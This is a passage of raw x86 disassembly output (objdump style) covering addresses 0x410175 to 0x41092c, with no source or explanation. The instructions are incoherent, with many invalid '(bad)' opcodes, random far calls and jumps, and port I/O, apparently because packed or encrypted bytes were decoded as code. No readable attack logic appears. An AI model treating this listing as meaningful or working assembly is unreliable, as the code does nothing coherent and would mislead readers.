  410175:	stos   DWORD PTR es:[edi],eax
  410176:	in     eax,dx
  410177:	jno    0x410117
  410179:	push   esi
  41017a:	std    
  41017b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41017c:	mov    ebp,0x722a1fbc
  410181:	call   0xa60e:0xa03ab16a
  410188:	addr16 loopne 0x4101f7
  41018b:	mov    ebp,0xcd40cef0
  410190:	mov    dh,0x3b
  410192:	repnz aas 
  410194:	and    BYTE PTR [esi-0x4ea1e901],bl
  41019a:	test   eax,0xad5e4f75
  41019f:	pop    eax
  4101a0:	jg     0x4101b3
  4101a2:	cmp    dh,BYTE PTR [esi-0x10]
  4101a5:	cmp    ebp,DWORD PTR [edi-0x2314e28b]
  4101ab:	test   BYTE PTR [esi],al
  4101ad:	or     eax,0xd988bbca
  4101b2:	xor    BYTE PTR [eax],cl
  4101b4:	out    0x77,eax
  4101b6:	jnp    0x4101cd
  4101b8:	push   es
  4101b9:	cs dec edi
  4101bb:	or     ebx,DWORD PTR [eax+0x7e62cc9f]
  4101c1:	fiadd  WORD PTR [ebp-0x56]
  4101c4:	and    edx,DWORD PTR [ebx+0x4a]
  4101c7:	sbb    eax,0xeb3fb9e1
  4101cc:	sub    DWORD PTR [esi],0xfffffff9
  4101cf:	pop    edx
  4101d0:	xchg   ebp,eax
  4101d1:	fistp  DWORD PTR [ebp+0x5e]
  4101d4:	inc    esp
  4101d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101d6:	and    eax,0x99609bd0
  4101db:	cwde   
  4101dc:	jo     0x410160
  4101de:	aad    0x67
  4101e0:	sbb    esp,DWORD PTR [eax+0x40]
  4101e3:	or     eax,0x875e5bf9
  4101e8:	push   cs
  4101e9:	jge    0x4101b8
  4101eb:	cmp    bh,bh
  4101ed:	xor    eax,DWORD PTR [ebx+0x11]
  4101f0:	pop    ebp
  4101f1:	pushf  
  4101f2:	test   al,0x60
  4101f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101f5:	sti    
  4101f6:	pop    ss
  4101f7:	and    eax,0x3108dffb
  4101fc:	mov    al,0xc5
  4101fe:	or     al,0x72
  410200:	dec    ebx
  410201:	mov    bl,0x3c
  410203:	add    BYTE PTR [esi],cl
  410205:	jmp    0x410274
  410207:	add    dh,cl
  410209:	inc    edx
  41020a:	and    al,BYTE PTR [ebx]
  41020c:	mov    edx,DWORD PTR [ecx-0x6b]
  41020f:	add    al,0xf5
  410211:	fld    DWORD PTR [esi-0x7e61a4e3]
  410217:	test   al,0x78
  410219:	or     al,0x85
  41021b:	mov    dh,0x4c
  41021d:	push   DWORD PTR [eax]
  41021f:	out    0x21,eax
  410221:	cmp    eax,0xdc58aea5
  410226:	adc    cl,dh
  410228:	xchg   ebx,eax
  410229:	dec    edx
  41022a:	push   eax
  41022b:	or     al,0x5
  41022d:	xchg   edi,eax
  41022e:	int3   
  41022f:	jmp    0x1797b6cf
  410234:	jns    0x4101e4
  410236:	jo     0x410268
  410238:	fidiv  DWORD PTR [esi-0x737098c4]
  41023e:	mov    esp,0x545dedac
  410243:	sahf   
  410244:	test   DWORD PTR [edx*8+0x16cefff3],esp
  41024b:	mov    eax,ds:0x8f165f61
  410250:	lahf   
  410251:	xor    BYTE PTR [eax-0x2b66e517],ah
  410257:	mov    esi,0x9b804db9
  41025c:	cmp    al,0x8e
  41025e:	push   edx
  41025f:	jnp    0x410269
  410261:	jmp    0x4102cd
  410263:	lds    edi,FWORD PTR [eax-0x709a5c51]
  410269:	dec    edi
  41026a:	add    eax,0xa052f4c0
  410270:	test   al,0xe8
  410272:	cmp    dh,al
  410274:	es and bl,dl
  410277:	inc    edx
  410278:	dec    esi
  410279:	push   ss
  41027a:	out    0x6,eax
  41027c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41027d:	bound  esp,QWORD PTR [edx-0x5d793d2d]
  410283:	cmp    DWORD PTR [ebx+0x60d0f0e2],ecx
  410289:	enter  0xe13,0x77
  41028d:	ficomp DWORD PTR [edi]
  41028f:	add    cl,BYTE PTR [ecx]
  410291:	ret    0x15d0
  410294:	sub    cl,BYTE PTR [edi]
  410296:	je     0x4102be
  410298:	call   FWORD PTR [ebx+0x3644a371]
  41029e:	popf   
  41029f:	ret    
  4102a0:	and    esi,DWORD PTR ds:0x204cb92d
  4102a6:	pop    es
  4102a7:	ins    DWORD PTR es:[edi],dx
  4102a8:	or     al,0x71
  4102aa:	lock in al,0x12
  4102ad:	sbb    edi,ecx
  4102af:	xchg   bh,cl
  4102b1:	xchg   ebx,eax
  4102b2:	(bad)  
  4102b3:	xchg   edx,eax
  4102b4:	imul   esp,DWORD PTR [eax+0x44bc5799],0x31
  4102bb:	call   0xece4:0xd7a24a4a
  4102c2:	out    dx,eax
  4102c3:	addr16 rcl ah,0x94
  4102c7:	and    al,0x51
  4102c9:	not    DWORD PTR [eax]
  4102cb:	cmp    eax,0x99c31b0b
  4102d0:	or     ebp,ecx
  4102d2:	outs   dx,BYTE PTR ds:[esi]
  4102d3:	ja     0x4102e5
  4102d5:	push   ss
  4102d6:	jnp    0x4102f5
  4102d8:	stc    
  4102d9:	xor    eax,0xfad04e69
  4102de:	std    
  4102df:	imul   esp,ebx,0xde4eee7f
  4102e5:	pop    ss
  4102e6:	and    eax,0xef39d6e5
  4102eb:	retf   
  4102ec:	jo     0x410284
  4102ee:	and    ebx,DWORD PTR [eax]
  4102f0:	js     0x410359
  4102f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102f3:	das    
  4102f4:	push   DWORD PTR [esp+ecx*8+0x7c]
  4102f8:	mov    dl,0xcf
  4102fa:	lea    ecx,[ebp-0x17]
  4102fd:	xchg   ecx,eax
  4102fe:	stc    
  4102ff:	mov    DWORD PTR [eax+ecx*8],0x6454301f
  410306:	lahf   
  410307:	dec    ebx
  410308:	adc    edi,DWORD PTR [esi+0x30cd94d6]
  41030e:	push   esi
  41030f:	fbstp  TBYTE PTR [edi+0x7a]
  410312:	xchg   ecx,eax
  410313:	or     eax,0x4f4bcc4d
  410318:	ja     0x41036f
  41031a:	call   0x6ab9:0x939ff5a6
  410321:	mov    dh,0x63
  410323:	pop    esp
  410324:	mov    cl,bl
  410326:	cdq    
  410327:	retf   0x64c8
  41032a:	mov    BYTE PTR [eax-0x58],bh
  41032d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41032e:	call   0x48ae:0x3d5b60e8
  410335:	add    al,BYTE PTR [edi+0x3cb0855d]
  41033b:	and    DWORD PTR [eax+0xf341b40],ebx
  410341:	cmp    eax,ecx
  410343:	les    edx,FWORD PTR [ecx-0x4b]
  410346:	jno    0x410335
  410348:	(bad)  
  410349:	fdivr  DWORD PTR [edx-0x35]
  41034c:	xchg   ebp,eax
  41034d:	pop    esp
  41034e:	iret   
  41034f:	xchg   cl,cl
  410351:	xor    ebp,DWORD PTR [edi+0xf5c321b]
  410357:	popa   
  410358:	and    DWORD PTR [esp+eax*4],0xc5f76b26
  41035f:	inc    esp
  410360:	push   esi
  410361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410362:	lea    ebx,[esi-0x5af5737]
  410368:	cli    
  410369:	xchg   DWORD PTR [ebp-0x3e],eax
  41036c:	add    al,0x19
  41036e:	in     al,0xf2
  410370:	mov    bh,0x73
  410372:	popf   
  410373:	leave  
  410374:	jmp    0xb9c5:0xf723c5e7
  41037b:	mov    dh,0x80
  41037d:	out    dx,eax
  41037e:	mov    ds:0xa356513c,al
  410383:	sar    edx,1
  410385:	jge    0x41037a
  410387:	lods   al,BYTE PTR ds:[esi]
  410388:	and    eax,0xc59d1242
  41038d:	aas    
  41038e:	mov    edi,0x118b9495
  410393:	pop    esi
  410394:	retf   
  410395:	sbb    edx,DWORD PTR [eax-0x55]
  410398:	or     al,0x61
  41039a:	add    bh,ch
  41039c:	jge    0x410385
  41039e:	test   DWORD PTR [ebx-0x40],0xd80297ed
  4103a5:	loopne 0x410421
  4103a7:	xchg   ebp,eax
  4103a8:	push   ds
  4103a9:	fwait
  4103aa:	out    0xd7,eax
  4103ac:	sub    BYTE PTR [ecx],bl
  4103ae:	lea    edi,[esp+edi*2-0x742ca5a2]
  4103b5:	iret   
  4103b6:	add    edi,DWORD PTR [ebp+ebp*1-0x65]
  4103ba:	out    dx,eax
  4103bb:	xchg   esi,eax
  4103bc:	loopne 0x4103bf
  4103be:	lds    esp,FWORD PTR [esi]
  4103c0:	jbe    0x410401
  4103c2:	dec    ch
  4103c4:	stc    
  4103c5:	stc    
  4103c6:	imul   esp,DWORD PTR [ebx+0x76],0x8d64138
  4103cd:	dec    edx
  4103ce:	cmp    eax,0x59966cb3
  4103d3:	in     al,dx
  4103d4:	push   ecx
  4103d5:	adc    DWORD PTR [ebp+0x78be6de8],eax
  4103db:	xchg   BYTE PTR [eax-0xc],dl
  4103de:	into   
  4103df:	std    
  4103e0:	call   0x572e49af
  4103e5:	ret    
  4103e6:	pop    ecx
  4103e7:	dec    eax
  4103e8:	imul   ecx,DWORD PTR [edi+0x380a84f5],0xffffffd2
  4103ef:	out    0xca,al
  4103f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103f2:	xchg   edx,eax
  4103f3:	fmul   st,st(5)
  4103f5:	dec    eax
  4103f6:	and    ebp,ecx
  4103f8:	or     BYTE PTR [ebx],al
  4103fa:	push   esi
  4103fb:	sti    
  4103fc:	sahf   
  4103fd:	cmp    eax,0x1e6bc65d
  410402:	mov    ds:0x5821909,al
  410407:	push   0x38
  410409:	ror    BYTE PTR [ecx+0x76],1
  41040c:	outs   dx,DWORD PTR ds:[esi]
  41040d:	les    esp,FWORD PTR [eax]
  41040f:	loopne 0x410442
  410411:	lods   eax,DWORD PTR ds:[esi]
  410412:	mov    dh,0xc7
  410414:	pushf  
  410415:	dec    ebx
  410416:	test   eax,0xe702bcec
  41041b:	aam    0x9c
  41041d:	fnstcw WORD PTR [eax+0x360413e5]
  410423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410424:	mov    ebx,0x826d7113
  410429:	mov    fs,WORD PTR [edx+0x3f]
  41042c:	jno    0x41040d
  41042e:	mov    ah,0x68
  410430:	adc    DWORD PTR [ecx+0x51],eax
  410433:	sbb    dh,BYTE PTR [esi+0x5]
  410436:	rcr    DWORD PTR ss:[esi-0x125967d9],1
  41043d:	bound  esp,QWORD PTR [ecx]
  41043f:	mov    ebp,0x217efd86
  410444:	(bad)  
  410445:	(bad)  
  410446:	stc    
  410447:	loop   0x410491
  410449:	push   es
  41044a:	pusha  
  41044b:	outs   dx,DWORD PTR ds:[esi]
  41044c:	loope  0x4103fd
  41044e:	int3   
  41044f:	loope  0x41047f
  410451:	sbb    edi,ecx
  410453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410454:	inc    ebx
  410455:	out    dx,eax
  410456:	sub    ah,cl
  410458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410459:	mov    dl,0xaa
  41045b:	mov    bl,0x11
  41045d:	int3   
  41045e:	or     al,0xd3
  410461:	ins    BYTE PTR es:[edi],dx
  410462:	out    dx,eax
  410463:	ins    BYTE PTR es:[edi],dx
  410464:	icebp  
  410465:	retf   
  410466:	out    dx,eax
  410467:	sub    ebp,esi
  410469:	iret   
  41046a:	stc    
  41046b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41046c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41046d:	inc    ebp
  41046e:	dec    edi
  41046f:	int3   
  410470:	aas    
  410471:	xchg   edi,eax
  410472:	icebp  
  410473:	xchg   esp,eax
  410474:	inc    edi
  410475:	(bad)  
  410476:	sbb    al,0xa5
  410478:	or     DWORD PTR [ebp-0x5c094034],esi
  41047e:	sbb    ah,bl
  410480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410481:	test   eax,0x3eea03fc
  410486:	shr    DWORD PTR [edi-0x7c04e52],1
  41048c:	mov    ds:0xe3a3539f,eax
  410491:	jecxz  0x4104a1
  410493:	sbb    ah,BYTE PTR [ecx]
  410495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410496:	push   DWORD PTR [eax+0x37ec65ec]
  41049c:	imul   DWORD PTR [eax+0x3a]
  41049f:	scas   eax,DWORD PTR es:[edi]
  4104a0:	stos   BYTE PTR es:[edi],al
  4104a1:	in     eax,0x4d
  4104a3:	fcom   QWORD PTR ds:0x51ec6622
  4104a9:	retf   0x444b
  4104ac:	dec    esi
  4104ad:	pushf  
  4104ae:	addr16 stc 
  4104b0:	push   esi
  4104b1:	repz jmp 0x410456
  4104b4:	sahf   
  4104b5:	mov    ebp,0xbed73f6c
  4104ba:	jns    0x41043d
  4104bc:	pop    ebp
  4104bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104be:	cld    
  4104bf:	jne    0x41052b
  4104c1:	enter  0x68bc,0xb5
  4104c5:	xchg   edx,eax
  4104c6:	push   0x65
  4104c8:	shl    DWORD PTR [edi-0x57],1
  4104cb:	sti    
  4104cc:	inc    edx
  4104cd:	daa    
  4104ce:	push   cs
  4104cf:	dec    esi
  4104d0:	(bad)  
  4104d2:	ret    
  4104d3:	(bad)  
  4104d4:	jmp    0x5dcca9c8
  4104d9:	fs out 0xc6,al
  4104dc:	mov    dh,0xc7
  4104de:	and    eax,0xa29ab574
  4104e3:	mov    al,0x40
  4104e5:	repnz (bad) 
  4104e7:	xlat   BYTE PTR ds:[ebx]
  4104e8:	lds    ebp,FWORD PTR [edx+0x62]
  4104eb:	clc    
  4104ec:	loopne 0x410553
  4104ee:	out    0x75,eax
  4104f0:	pop    edi
  4104f1:	out    dx,al
  4104f2:	add    al,0xf
  4104f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104f5:	sub    dh,BYTE PTR [edx+0x31df4324]
  4104fb:	inc    edx
  4104fc:	and    eax,0xad628c0
  410501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410502:	popf   
  410503:	retf   
  410504:	sub    bh,BYTE PTR [eax]
  410506:	call   0xaf0c4439
  41050b:	(bad)  
  41050c:	mov    eax,ds:0x8a50f715
  410511:	pop    esp
  410512:	jmp    0x49c3:0xd6f3efe1
  410519:	pop    esp
  41051a:	ins    BYTE PTR es:[edi],dx
  41051b:	outs   dx,BYTE PTR ds:[esi]
  41051c:	push   ss
  41051d:	mov    ebx,0xd28a9de2
  410522:	and    al,0x9d
  410524:	imul   edx,DWORD PTR [esi+0x2a],0xd56efaba
  41052b:	outs   dx,DWORD PTR ds:[esi]
  41052c:	stc    
  41052d:	pushf  
  41052e:	mov    ebp,0xa194f5d9
  410533:	pop    eax
  410534:	xor    dl,BYTE PTR [esp+edi*8]
  410537:	cwde   
  410538:	sahf   
  410539:	cdq    
  41053a:	into   
  41053b:	sbb    al,0x12
  41053d:	mov    dl,0x3c
  41053f:	pop    esi
  410540:	call   0x89700f85
  410545:	into   
  410546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410548:	xor    BYTE PTR [eax+0x56e5b365],0xc2
  41054f:	push   0xffffffe9
  410551:	push   edi
  410552:	or     eax,0x15a70104
  410557:	or     BYTE PTR [ecx],ah
  410559:	pop    ss
  41055a:	xchg   ebx,eax
  41055b:	out    dx,al
  41055c:	in     ax,dx
  41055e:	jp     0x410501
  410560:	inc    edi
  410561:	iret   
  410562:	ds repz add eax,0x3dcdf0cf
  410569:	mov    dh,0xd0
  41056b:	repz add BYTE PTR [eax-0x117c2aa4],al
  410572:	xor    eax,0xc384b01d
  410577:	mov    WORD PTR [ecx],es
  410579:	push   eax
  41057a:	lea    ebp,[ebx+esi*1-0x7a]
  41057e:	mov    DWORD PTR [ebp+0x643bb41f],ebp
  410584:	repnz mov al,0xcb
  410587:	push   0xffffffb2
  410589:	lahf   
  41058a:	xor    BYTE PTR [eax+0x17bc2621],bl
  410590:	arpl   si,sp
  410592:	(bad)  
  410594:	ret    
  410595:	fstp   st(2)
  410597:	mov    dh,0x9a
  410599:	jne    0x410526
  41059b:	lods   al,BYTE PTR ds:[esi]
  41059c:	mov    edx,0x9e5c1a98
  4105a1:	push   ebx
  4105a2:	shl    cl,1
  4105a4:	inc    ecx
  4105a5:	hlt    
  4105a6:	daa    
  4105a7:	sbb    al,0x5b
  4105a9:	or     DWORD PTR [edi],ecx
  4105ab:	mov    ebx,DWORD PTR [ecx+esi*2]
  4105ae:	mov    al,0x16
  4105b0:	push   ebx
  4105b1:	add    DWORD PTR [edi-0x57],0x23333eb4
  4105b8:	xchg   ebp,eax
  4105b9:	mov    eax,ds:0xd58cf18a
  4105be:	inc    esp
  4105bf:	push   ebx
  4105c0:	cli    
  4105c1:	dec    esp
  4105c2:	jb     0x41059c
  4105c4:	sub    DWORD PTR [ebx+0x32],ecx
  4105c7:	push   edx
  4105c8:	add    BYTE PTR [esi-0xa],dh
  4105cb:	adc    al,0xa
  4105cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105ce:	xor    al,0x3b
  4105d0:	cmp    ah,BYTE PTR [eax-0x399f9ee]
  4105d6:	inc    esi
  4105d7:	test   eax,0x96704233
  4105dc:	lods   al,BYTE PTR ds:[esi]
  4105dd:	ds fs gs jp 0x4105d9
  4105e2:	lock mov edx,0x56f5e523
  4105e8:	aad    0xf7
  4105ea:	mov    eax,0xd26293b1
  4105ef:	fmul   st(4),st
  4105f1:	mov    fs,edx
  4105f3:	out    0x2e,al
  4105f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105f6:	mov    cl,0xc5
  4105f8:	leave  
  4105f9:	or     eax,0x35443ec1
  4105fe:	addr16 adc eax,0x1701f470
  410604:	inc    edx
  410605:	mov    ecx,0xdece9032
  41060a:	push   0x11363bae
  41060f:	aam    0x5
  410611:	sub    DWORD PTR [eax],0x61
  410614:	mov    cs,WORD PTR [eax]
  410616:	pop    ecx
  410617:	pop    esi
  410618:	cs push 0x1e
  41061b:	dec    ebp
  41061c:	shr    DWORD PTR [eax+edi*2+0x479d3265],1
  410623:	ret    0xf4d0
  410626:	call   0x95dbca9b
  41062b:	ret    0x95fb
  41062e:	ins    DWORD PTR es:[edi],dx
  41062f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410630:	or     ecx,edx
  410632:	(bad)
  410636:	sete   BYTE PTR [ebx]
  410639:	mov    cl,BYTE PTR [esi]
  41063b:	sub    DWORD PTR [ebp+0x13],edx
  41063e:	dec    eax
  41063f:	pop    ebp
  410640:	fisubr WORD PTR [ecx+edx*8-0xbde45f5]
  410647:	pop    ecx
  410648:	aas    
  410649:	mov    BYTE PTR cs:[ebx+0x56],ch
  41064d:	mov    eax,ds:0xa8f4c614
  410652:	add    al,0x1c
  410654:	mov    ebp,0x29f246a2
  410659:	cmp    DWORD PTR [ebx-0x70028775],edi
  41065f:	lahf   
  410660:	inc    esp
  410661:	imul   DWORD PTR ds:0xbcc75563
  410667:	cmp    DWORD PTR [ebx],0xea07c4a7
  41066d:	lods   al,BYTE PTR ds:[esi]
  41066e:	fs push eax
  410670:	add    DWORD PTR [ebx+0x32e382db],ebx
  410676:	xchg   DWORD PTR [esi+0x55ccc2ff],esp
  41067c:	dec    ebx
  41067d:	into   
  41067e:	or     esp,DWORD PTR [edx-0x29]
  410681:	adc    eax,0x4350d2b8
  410686:	xchg   DWORD PTR [ecx+edi*2+0x5e],ebx
  41068a:	mov    dl,BYTE PTR [ecx-0x3e9f43b9]
  410690:	arpl   WORD PTR [eax-0x25],si
  410693:	pop    ebx
  410694:	xchg   esp,eax
  410695:	lods   eax,DWORD PTR ds:[esi]
  410696:	ins    BYTE PTR es:[edi],dx
  410697:	int    0x31
  410699:	ficomp DWORD PTR [esi-0x75]
  41069c:	loopne 0x41067b
  41069e:	sub    dh,BYTE PTR [esi+0x2e958cb3]
  4106a4:	and    DWORD PTR [edx+ecx*8+0x62],eax
  4106a8:	cwde   
  4106a9:	retf   
  4106aa:	cdq    
  4106ab:	shl    ebp,0xda
  4106ae:	jbe    0x4106e3
  4106b0:	xor    edx,DWORD PTR ds:0x465139d
  4106b6:	out    0x7c,al
  4106b8:	sahf   
  4106b9:	jl     0x41072f
  4106bb:	adc    eax,0xa3d3d415
  4106c0:	lea    edx,[eax]
  4106c2:	jns    0x4106bd
  4106c4:	add    dh,BYTE PTR [ebx]
  4106c6:	gs test eax,0x862de628
  4106cc:	lods   eax,DWORD PTR ds:[si]
  4106ce:	mov    eax,0xe8e0ecfb
  4106d3:	hlt    
  4106d4:	ffreep st(0)
  4106d6:	cmp    al,0x54
  4106d8:	pusha  
  4106d9:	js     0x410755
  4106db:	push   ebx
  4106dc:	sub    al,al
  4106de:	(bad)  
  4106df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106e0:	sbb    ah,BYTE PTR [edx]
  4106e2:	das    
  4106e3:	add    ebx,DWORD PTR [esi+esi*1]
  4106e6:	in     eax,0x4e
  4106e8:	je     0x4106a6
  4106ea:	mov    WORD PTR [esi],gs
  4106ec:	xchg   BYTE PTR [esi],ah
  4106ee:	ss mov edi,0xaad41015
  4106f4:	hlt    
  4106f5:	(bad)  
  4106f6:	cmp    eax,DWORD PTR [ebp-0x5f3dd2d1]
  4106fc:	xchg   ecx,ecx
  4106fe:	mov    ebp,0x16a1dd84
  410703:	repz add ah,al
  410706:	daa    
  410707:	mov    al,0xc4
  410709:	stc    
  41070a:	lods   al,BYTE PTR ds:[esi]
  41070b:	(bad)  
  41070c:	mov    ds:0xd606da7b,eax
  410711:	push   edx
  410712:	adc    esp,ebx
  410714:	(bad)  
  410715:	or     esi,ebp
  410717:	(bad)  
  410718:	dec    ebx
  410719:	(bad)  
  41071a:	xchg   ecx,eax
  41071b:	mov    cl,0x2
  41071d:	sbb    al,0xec
  41071f:	adc    DWORD PTR [ebx],eax
  410721:	push   0xb5aa70b2
  410726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410727:	js     0x4106ad
  410729:	inc    esi
  41072a:	jge    0x4107a7
  41072c:	dec    ebx
  41072d:	cmp    eax,0xb43157ad
  410732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410733:	stos   DWORD PTR es:[edi],eax
  410734:	popf   
  410735:	mov    BYTE PTR [ebx-0x7ffe64f2],bh
  41073b:	into   
  41073c:	mov    ch,0xa6
  41073e:	pop    esp
  41073f:	call   0xf572:0xe6d82f35
  410746:	mov    eax,0x532a9e26
  41074b:	stos   BYTE PTR es:[edi],al
  41074c:	dec    esp
  41074d:	cwde   
  41074e:	push   ds
  41074f:	icebp  
  410750:	xor    edx,DWORD PTR [eax+0x3b13d93c]
  410756:	mov    eax,gs
  410758:	aam    0x10
  41075a:	test   eax,0x23e87735
  41075f:	or     al,0x9a
  410761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410762:	add    dh,bh
  410764:	jbe    0x410735
  410766:	add    al,0x12
  410768:	xor    edi,ecx
  41076a:	sub    ecx,DWORD PTR [ecx-0x1a]
  41076d:	pop    ds
  41076e:	xor    eax,0xf758cbb5
  410773:	loop   0x410789
  410775:	ja     0x4107de
  410777:	(bad)  
  410779:	icebp  
  41077a:	mov    ah,0x2f
  41077c:	push   esi
  41077d:	popa   
  41077e:	mov    dh,0xcd
  410780:	or     al,0xe3
  410782:	xchg   edi,eax
  410783:	and    dh,BYTE PTR ds:[edx+0x4465d8e8]
  41078a:	jl     0x410796
  41078c:	(bad)
  410790:	call   0x9619552d
  410795:	and    eax,0xffe3ac9f
  41079a:	inc    edi
  41079b:	jmp    0x9a14:0x93308d7f
  4107a2:	jg     0x41080e
  4107a4:	(bad)  
  4107a5:	sbb    ebx,DWORD PTR [esi+0x5355230]
  4107ab:	repz or cl,ah
  4107ae:	mov    bl,0x75
  4107b0:	xchg   edi,eax
  4107b1:	ins    BYTE PTR es:[edi],dx
  4107b2:	lock iret 
  4107b4:	in     eax,0x6
  4107b6:	retf   
  4107b7:	push   cs
  4107b8:	enter  0x5fcc,0x80
  4107bc:	mov    ah,0x7b
  4107be:	sub    ah,dh
  4107c0:	imul   esp,DWORD PTR [esi],0xc78cf538
  4107c6:	push   ebp
  4107c7:	imul   edx,DWORD PTR [ecx],0x17
  4107ca:	test   al,0x37
  4107cc:	stos   DWORD PTR es:[edi],eax
  4107cd:	test   ch,0x36
  4107d0:	mov    esp,0xa75eb1cb
  4107d5:	mov    ch,0xe2
  4107d7:	adc    ecx,DWORD PTR fs:[edi]
  4107da:	push   ds
  4107db:	mov    ch,0x26
  4107dd:	adc    esp,DWORD PTR ds:0xd632ed23
  4107e3:	lock inc ebx
  4107e5:	fistp  DWORD PTR [esi+0x7dbe056c]
  4107eb:	ja     0x4107dd
  4107ed:	enter  0x37e9,0x6
  4107f1:	(bad)  
  4107f2:	ja     0x4107b0
  4107f4:	gs and eax,0xc93fcba8
  4107fa:	sbb    BYTE PTR [esp],al
  4107fd:	jbe    0x41084f
  4107ff:	push   esp
  410800:	dec    ebp
  410801:	xchg   ebx,eax
  410802:	jl     0x4107c6
  410804:	(bad)  
  410805:	sub    eax,0x3091244e
  41080a:	mov    esi,0x3471360e
  41080f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410810:	jbe    0x410862
  410812:	mov    dh,0x1f
  410814:	stc    
  410815:	cli    
  410816:	lds    ebp,FWORD PTR [eax+eax*2+0x7b48d728]
  41081d:	jle    0x410848
  41081f:	sbb    al,0x31
  410821:	mov    ds:0xb8ce415f,al
  410826:	inc    edx
  410827:	ror    DWORD PTR [esi-0x1d],0x1a
  41082b:	addr16 push ebx
  41082d:	fisub  DWORD PTR [edx-0x35]
  410830:	xor    dl,al
  410832:	add    DWORD PTR [ebp-0x36],esp
  410835:	arpl   WORD PTR [ecx],sp
  410837:	test   DWORD PTR [eax],edi
  410839:	repnz mov DWORD PTR [eax+0xb18cfdf],edx
  410840:	pop    es
  410841:	inc    esi
  410842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410843:	in     al,dx
  410844:	cmp    DWORD PTR [ebp+eiz*2+0x4e537302],0x35
  41084c:	js     0x410836
  41084e:	les    ebp,FWORD PTR [edi]
  410850:	fst    DWORD PTR [edx-0x363ae1a2]
  410856:	mov    edi,0x8f94dc20
  41085b:	mov    ebp,0x32fac4c3
  410860:	jo     0x410810
  410862:	jecxz  0x4108ae
  410864:	adc    eax,0xcb237e4e
  410869:	sub    eax,0x6154d5a
  41086e:	xor    al,BYTE PTR [eax-0x49]
  410871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410872:	clc    
  410873:	jecxz  0x4108ad
  410875:	adc    ah,BYTE PTR [edi]
  410877:	out    dx,eax
  410878:	mov    BYTE PTR [edi-0x36],al
  41087b:	mov    dh,0x98
  41087d:	sbb    eax,0xa4dcb587
  410882:	push   esp
  410883:	je     0x410903
  410885:	ins    BYTE PTR es:[edi],dx
  410886:	lds    edi,FWORD PTR [esi-0x292c994c]
  41088c:	fld    QWORD PTR [edi-0x5f27e877]
  410892:	outs   dx,DWORD PTR ds:[esi]
  410893:	add    bh,dl
  410895:	pop    eax
  410896:	mov    dl,0x58
  410898:	xor    al,0xe1
  41089a:	ins    DWORD PTR es:[edi],dx
  41089b:	mov    dl,0xb0
  41089d:	rol    DWORD PTR [edx-0x3],0xb3
  4108a1:	fucomi st,st(6)
  4108a3:	xchg   DWORD PTR [esi+0x31],ebx
  4108a6:	ja     0x4108a4
  4108a8:	xor    DWORD PTR [ebx+ebp*1],ebx
  4108ab:	cmp    ecx,ebp
  4108ad:	cmp    esp,ebp
  4108af:	or     eax,0x392fca6
  4108b4:	fs dec esi
  4108b6:	mov    esi,0x8c0d8f37
  4108bb:	push   ds
  4108bc:	bswap  edi
  4108be:	scas   al,BYTE PTR es:[edi]
  4108bf:	and    edi,DWORD PTR [eax+0x25d18df8]
  4108c5:	hlt    
  4108c6:	call   0xd366:0xd443f41b
  4108cd:	fild   WORD PTR ss:[edx-0x3e]
  4108d1:	mov    ebp,0x1281118
  4108d6:	adc    bl,BYTE PTR [ebp+0x6b]
  4108d9:	mov    ds:0xfffef1d3,eax
  4108de:	stos   DWORD PTR es:[edi],eax
  4108df:	dec    esp
  4108e0:	mov    ch,0x38
  4108e2:	mov    dl,0xb3
  4108e4:	xchg   edx,eax
  4108e5:	fwait
  4108e6:	(bad)  
  4108e7:	dec    ebp
  4108e8:	test   BYTE PTR [eax],bl
  4108ea:	shl    DWORD PTR [esi],cl
  4108ec:	pop    esp
  4108ed:	mov    ah,0x70
  4108ef:	fbstp  TBYTE PTR [esi]
  4108f1:	inc    esp
  4108f2:	sti    
  4108f3:	call   0x24847653
  4108f8:	cmp    al,0xed
  4108fa:	fdivr  st,st(2)
  4108fc:	(bad)  
  4108fd:	cld    
  4108fe:	lahf   
  4108ff:	mov    al,0x8f
  410901:	idiv   BYTE PTR [ecx]
  410903:	icebp  
  410904:	ja     0x410918
  410906:	cmp    al,0xed
  410908:	mov    BYTE PTR [edx],dh
  41090a:	jp     0x410936
  41090c:	mov    ch,0xdc
  41090e:	dec    ebp
  41090f:	(bad)  
  410910:	xlat   BYTE PTR ds:[ebx]
  410911:	rol    bl,0x7a
  410914:	sbb    eax,0xf833bcf4
  410919:	in     eax,dx
  41091a:	sbb    eax,0xe0d31027
  41091f:	mov    ch,0x32
  410921:	jmp    0x72d947e1
  410926:	push   edi
  410927:	xchg   DWORD PTR [eax+0x73],ebx
  41092a:	test   al,0x9
  41092c:	outs   dx,DWORD PTR ds:[esi]
